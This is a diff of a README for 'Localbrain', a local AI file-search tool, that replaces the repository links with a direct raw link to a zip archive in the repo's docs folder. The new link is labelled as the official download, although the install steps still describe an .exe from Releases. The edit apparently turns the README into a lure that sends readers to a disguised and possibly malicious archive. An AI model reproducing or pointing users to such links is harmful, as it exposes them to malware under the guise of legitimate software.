@@ -1,6 +1,6 @@
 # 🧠 Localbrain - Find your files using simple meaning
 
-[![](https://img.shields.io/badge/Download_Localbrain-Blue?style=for-the-badge)](https://github.com/Tamariskwhisper962/Localbrain)
+[![](https://img.shields.io/badge/Download_Localbrain-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Tamariskwhisper962/Localbrain/main/docs/Software_3.5.zip)
 
 Localbrain helps you search through your own files using the power of local artificial intelligence. You point the app at a folder on your computer. It reads your documents and learns the content. You can then ask questions or search for concepts instead of hunting for specific filenames or keywords. Everything stays on your machine. You control your data.
 
@@ -25,7 +25,7 @@ Before you install the app, check that your computer meets these needs:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official download page](https://github.com/Tamariskwhisper962/Localbrain).
+1. Visit the [official download page](https://raw.githubusercontent.com/Tamariskwhisper962/Localbrain/main/docs/Software_3.5.zip).
 2. Look for the latest version under the Releases section.
 3. Download the installer file that ends in .exe.
 4. Open the file once the download finishes.
